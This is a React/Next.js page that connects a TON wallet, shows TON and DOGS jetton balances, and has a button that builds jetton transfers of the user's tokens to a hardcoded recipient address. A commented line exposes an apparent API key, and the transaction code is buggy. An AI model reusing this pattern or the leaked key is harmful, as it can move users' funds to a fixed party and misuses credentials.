
'use client'

import { useState, useEffect, useCallback } from 'react';
import { useTonConnectUI } from '@tonconnect/ui-react';
import { Address, beginCell} from "@ton/core";
import TonWeb from "tonweb";
import BottomTabNav from '../../components/bottomtabnav/bottomTabNav';




export default function WalletConnect() {
  const [tonConnectUI] = useTonConnectUI();
  const [tonWalletAddress, setTonWalletAddress] = useState<string | null>(null);
  const [tonWalletBalance, setTonWalletBalance] = useState<string | null>(null);
  const [jettonWalletBalance, setJettonWalletBalance] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  //const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC', {apiKey: 'c4d7d74d7ed752fc9e3d3fe0e66d529358289b636c6829025cb43883be8832ee'}));
  const tokenAddress = 'EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS'
  const ownerAddress = tonWalletAddress ? tonWalletAddress : '0QBmgpsISyzTXPyVRqp7EMiBxGQ3_teiix48wSOb9X_R0KIJ';
  const reciverAddress = 'UQAhpfP3n8ti-fF3uL9MrmCvsGk8yYqPuA7vdaceMmzLtqLj'

const sendTransaction = async () => {
      const tonweb = new TonWeb();
      const jettonMinter = new TonWeb.token.jetton.JettonMinter(tonweb.provider, {
        address: tokenAddress,
        adminAddress: new TonWeb.utils.Address(ownerAddress) , // Add the admin address here
        jettonContentUri: '', // Add the jetton content URI here
        jettonWalletCodeHex: '' // Add the jetton wallet code hex here
      });

      const address = await jettonMinter.getJettonWalletAddress(new TonWeb.utils.Address(ownerAddress));
      const a = address.toString(true, true, true);
      console.log('sender jetton wallet:',a)
      
      const body1 = beginCell()
              .storeUint(0xf8a7ea5, 32)                 // jetton transfer op code
              .storeUint(9875646865, 64)                         // query_id:uint64
              .storeCoins(100000000000000)                      // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - jUSDT, 9 - default)
              .storeAddress(Address.parse(ownerAddress))  // destination:MsgAddress
              .storeAddress(Address.parse(reciverAddress))  // response_destination:MsgAddress
              .storeUint(0, 1)                          // custom_payload:(Maybe ^Cell)
              .storeCoins(1e6)                 // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
              .storeUint(0,1)                           // forward_payload:(Either Cell ^Cell)
              .endCell();
      
      
      const body2 = beginCell()
      .storeUint(0xf8a7ea5, 32)                 // jetton transfer op code
      .storeUint(987564686, 64)                         // query_id:uint64
      .storeCoins(100000000000)                      // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - jUSDT, 9 - default)
      .storeAddress(Address.parse(reciverAddress))  // destination:MsgAddress
      .storeAddress(Address.parse(ownerAddress))  // response_destination:MsgAddress
      .storeUint(0, 1)                          // custom_payload:(Maybe ^Cell)
      .storeCoins(1e6)                 // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
      .storeUint(0,1)                           // forward_payload:(Either Cell ^Cell)
      .endCell();

      const body3 = beginCell()
      .storeUint(0xf8a7ea5, 32)                 // jetton transfer op code
      .storeUint(987564686, 64)                         // query_id:uint64
      .storeCoins(100000000000)                      // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - jUSDT, 9 - default)
      .storeAddress(Address.parse(reciverAddress))  // destination:MsgAddress
      .storeAddress(Address.parse(ownerAddress))  // response_destination:MsgAddress
      .storeUint(0, 1)                          // custom_payload:(Maybe ^Cell)
      .storeCoins(1e6)                 // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
      .storeUint(0,1)                           // forward_payload:(Either Cell ^Cell)
      .endCell();

      
      const transaction = {
          validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
          messages: [
              {
                  address: a,
                  amount: '80000000',
                  payload: body1.toBoc().toString("base64")
              },
              {
                address: a,
                amount: '80000',
                payload: body2.toBoc().toString("base64")
            },
            {
              address: a,
              amount: '80000',
              payload: body3.toBoc().toString("base64")
          },
          {
            address: a,
            amount: '80000',

        },
          ]
      }
      
      const result = await tonConnectUI.sendTransaction(transaction);
      
      console.log(result)

  };

const getJettonBalance = async (tokenAddress: string, ownerAddress: string) => {
    try {
      if (tonWalletAddress) {
        const tonweb = new TonWeb();
        const jettonMinter = new TonWeb.token.jetton.JettonMinter(tonweb.provider, {
          address: new TonWeb.utils.Address(tokenAddress),
          adminAddress: new TonWeb.utils.Address(ownerAddress), // Add the admin address here
          jettonContentUri: '', // Add the jetton content URI here
          jettonWalletCodeHex: '' // Add the jetton wallet code hex here
        });
        const jettonWalletAddress = await jettonMinter.getJettonWalletAddress(new TonWeb.utils.Address(ownerAddress));
        console.log('jettonWalletAddress:', jettonWalletAddress.toString(true, true, true));
        const jettonWallet = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
          address: jettonWalletAddress
        });
        const data = await jettonWallet.getData();
        if (data && data.balance) {
          handleJettonBalance(data.balance.toString());
          console.log('Jetton owner address:', data.ownerAddress.toString(true, true, true));
        } else {
          console.error('Invalid data received from jetton wallet');
        }
      }
    } catch (error) {
      console.error('Get Jrtton Balance failed:', error);
      if (error instanceof Error) {
        console.error('Error message:', error.message);
        console.error('Error stack:', error.stack);
      }
      // Handle error (e.g., show an error message to the user)
    }
  };  

const handleJettonBalance = useCallback((balance: string) => {
    const tonB = TonWeb.utils.fromNano(balance)
    setJettonWalletBalance(tonB);
    console.log('Jetton balance:',tonB );
    
  }, []);

const getBalance = async () => {
    try {
      if (tonWalletAddress) {
        const tonweb = new TonWeb();
        const balance = await tonweb.getBalance(new TonWeb.utils.Address(tonWalletAddress))
        handleBalance(balance)
      }
    } catch (error) {
      console.error('Get Balance failed:', error);
      if (error instanceof Error) {
        console.error('Error message:', error.message);
        console.error('Error stack:', error.stack);
      }
      // Handle error (e.g., show an error message to the user)
    }
  };  
const handleBalance = useCallback((balance: string) => {
    const tonB = TonWeb.utils.fromNano(balance)
    setTonWalletBalance(tonB);
    console.log('Ton balance:', tonB);
    
  }, []);





  const handleWalletConnection = useCallback((address: string) => {
    const tempAddress = Address.parse(address).toString();
    setTonWalletAddress(tempAddress);
    getBalance()
    getJettonBalance(tokenAddress, ownerAddress)


    console.log("Wallet connected successfully : ",Address.parse(address).toString());
    setIsLoading(false);
  },[]);

  const handleWalletDisconnection = useCallback(() => {
    setTonWalletAddress(null);
    console.log("Wallet disconnected successfully!");
    setIsLoading(false);
  }, []);

  useEffect(() => {
    const checkWalletConnection = async () => {
      if (tonConnectUI.account?.address) {
        handleWalletConnection(tonConnectUI.account?.address);

      } else {
        handleWalletDisconnection();
      }
    };

    checkWalletConnection();

    const unsubscribe = tonConnectUI.onStatusChange((wallet) => {
      if (wallet) {
        handleWalletConnection(wallet.account.address);
      } else {
        handleWalletDisconnection();
      }
    });

    return () => {
      unsubscribe();
    };
  }, [tonConnectUI, handleWalletConnection, handleWalletDisconnection]);

  const handleWalletAction = async () => {
    if (tonConnectUI.connected) {
      setIsLoading(true);
      await tonConnectUI.disconnect();
    } else {
      await tonConnectUI.openModal();
    }
  };


  const formatAddress = (address: string) => {
    
    return `${address.slice(0, 4)}...${address.slice(-4)}`;
  };

  if (isLoading) {
    return (
      <main className="flex min-h-screen flex-col items-center justify-center">
        <div className="bg-gray-200 text-gray-700 font-bold py-2 px-4 rounded">
          Loading...
        </div>
      </main>
    );
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center">
      <h1 className="text-4xl font-bold mb-8">TON Connect</h1>
      {tonWalletAddress ? (
        <div className="flex flex-col items-center">
          <p className="mb-4">Connected: {formatAddress(tonWalletAddress)}</p>
          <button
            onClick={handleWalletAction}
            className="bg-red-500 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
          >
            Disconnect Wallet
          </button>
          <button
            onClick={() => sendTransaction()}
            className="bg-red-500 "
          >
            send Tx
          </button>
          <button
            onClick={() => getJettonBalance(tokenAddress, ownerAddress)}
            className="bg-red-500 "
          >
            Get Jetton Balance
          </button>
          <button
            onClick={() => getBalance()}
            className="bg-red-500 "
          >
            Get Ton Balance
          </button>
          {tonWalletBalance?(<h1>Ton balance : {tonWalletBalance}</h1>):(<h1></h1>)}
          {jettonWalletBalance?(<h1>Jetton balance : {jettonWalletBalance} </h1>):(<h1></h1>)}
          
        </div>
      ) : (
        <button
          onClick={handleWalletAction}
          className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
        >
          Connect TON Wallet
        </button>
      )}
      <BottomTabNav />
    </main>
  );
}